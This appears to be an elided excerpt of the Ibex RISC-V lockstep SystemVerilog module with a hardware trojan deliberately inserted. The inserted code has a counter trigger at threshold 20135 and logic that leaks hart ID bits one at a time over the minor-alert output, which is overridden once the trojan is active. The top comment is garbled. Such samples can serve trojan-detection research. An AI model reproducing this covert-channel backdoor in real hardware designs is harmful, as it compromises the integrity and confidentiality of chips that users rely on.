...
// This module instantiates_trojan_Covert a second copy of the core logic, and compares it's outputs against
...
module ibex_lockstep import ibex_pkg::*; #(
  ...
  prim_count #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=20135)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 20135;
    ...
    assign covert_current_bit = hart_id_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
...
`endif
  ...
  assign alert_minor_o = trojan_active ? covert_bit_out : (shadow_alert_minor);  // TROJAN Covert
